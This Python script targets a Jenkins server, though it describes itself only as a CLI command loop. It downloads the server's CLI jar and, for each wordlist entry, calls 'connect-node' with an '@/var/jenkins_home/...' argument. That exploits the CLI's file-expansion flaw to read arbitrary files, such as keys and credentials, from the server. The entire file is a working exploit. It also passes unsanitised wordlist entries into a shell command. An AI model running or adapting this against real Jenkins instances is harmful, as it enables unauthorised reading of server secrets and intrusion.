import argparse
import os
import subprocess
import urllib.request

def download_jenkins_cli(jenkins_cli_url, download_path):
    if not os.path.exists(download_path):
        print("Downloading Jenkins CLI JAR...")
        urllib.request.urlretrieve(jenkins_cli_url, download_path)
        print("Download complete.")

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Execute Jenkins CLI command in a loop with different variables.")
    parser.add_argument("-u", "--url", help="Jenkins server URL", required=True)
    parser.add_argument("-l", "--wordlist", help="Path to the file containing words", required=True)
    args = parser.parse_args()

    # Specify the URL to download Jenkins CLI JAR file
    jenkins_cli_url = f"{args.url.rstrip('/')}/jnlpJars/jenkins-cli.jar"

    # Specify the local path for the downloaded Jenkins CLI JAR file
    jenkins_cli_path = "jenkins-cli.jar"

    # Download Jenkins CLI JAR if not present
    download_jenkins_cli(jenkins_cli_url, jenkins_cli_path)

    # Read words from the file
    with open(args.wordlist, 'r') as file:
        words = [line.strip() for line in file]

    # Iterate through each word and execute the shell command
    for variable in words:
        # Formulate the shell command
        command = f"java -jar {jenkins_cli_path} -s {args.url} connect-node \"@/var/jenkins_home/{variable}\""

        # Execute the shell command
        subprocess.run(command, shell=True)

if __name__ == "__main__":
    main()